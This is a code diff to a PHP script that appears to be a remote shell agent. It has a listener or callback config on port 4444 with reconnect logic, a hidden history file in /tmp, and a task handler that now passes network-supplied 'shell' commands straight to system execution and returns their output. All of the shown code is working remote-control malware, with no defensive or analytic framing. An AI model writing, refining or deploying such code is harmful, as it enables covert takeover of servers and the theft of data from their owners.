@@ -16,7 +16,7 @@ if(defined('PHP_MAJOR_VERSION')&&PHP_MAJOR_VERSION==5&&PHP_MINOR_VERSION<4){
 // =============================================
 // 1. CONFIG
 // =============================================
-$CFG=array('host'=>'10.13.5.162','port'=>4444,'http_port'=>8888,
+$CFG=array('host'=>'0.0.0.0','port'=>4444,'http_port'=>8888,
     'reconnect'=>5,'timeout'=>30,'hist_file'=>'/tmp/.ph_'.substr(md5(__FILE__),0,8),
     'hist_max'=>500,'version'=>'5.0','mode'=>'FULL','protocol'=>'auto','agent_id'=>'php-'.substr(md5(php_uname('n').getmypid()),0,8));
 $G=array('sock'=>null,'history'=>array(),'hist_idx'=>0,'jobs'=>array(),'job_cnt'=>0,'caps'=>array(),
@@ -511,18 +511,21 @@ function json_execute_task($task){
     if($cmd==='pwd')return array('status'=>'ok','output'=>getcwd());
     if($cmd==='capabilities'){global $G;return array('status'=>'ok','data'=>$G['caps']);}
 
-    $buf=fopen('php://memory','r+');
     $parts=preg_split('/\s+/',$raw,2);$cn=strtolower($parts[0]);$ca=isset($parts[1])?$parts[1]:'';
     $alias=get_alias($cn);if($alias){$fa=$alias.($ca?" $ca":'');$parts=preg_split('/\s+/',$fa,2);$cn=strtolower($parts[0]);$ca=isset($parts[1])?$parts[1]:'';$raw=$fa;}
 
-    if($CFG['mode']==='MINIMAL'){$result=dispatch_minimal($buf,$cn,$ca);}
-    elseif(is_passthru($cn)){xs($raw,$buf);}
-    else{$result=dispatch($buf,$cn,$ca,$raw);}
+    if(is_passthru($cn)||$cmd==='shell'){
+        $o='';$e='';$rc=x($raw,$o,$e);$output=$o;if($e)$output.=$e;
+        $output=preg_replace('/\033\[[0-9;]*m/','',$output);
+        return array('status'=>($rc===-1)?'error':'ok','output'=>$output,'exit_code'=>$rc);
+    }
 
+    $buf=fopen('php://memory','r+');
+    if($CFG['mode']==='MINIMAL'){$result=dispatch_minimal($buf,$cn,$ca);}
+    else{$result=dispatch($buf,$cn,$ca,$raw);}
     rewind($buf);$output=stream_get_contents($buf);fclose($buf);
     $output=preg_replace('/\033\[[0-9;]*m/','',$output);
-    if(isset($result)&&$result==='exit')return array('status'=>'ok','output'=>$output,'_action'=>'exit');
-    if(isset($result)&&$result==='die')return array('status'=>'ok','output'=>$output,'_action'=>'exit');
+    if(isset($result)&&($result==='exit'||$result==='die'))return array('status'=>'ok','output'=>$output,'_action'=>'exit');
     return array('status'=>'ok','output'=>$output);
 }
 function json_main_loop($sock){
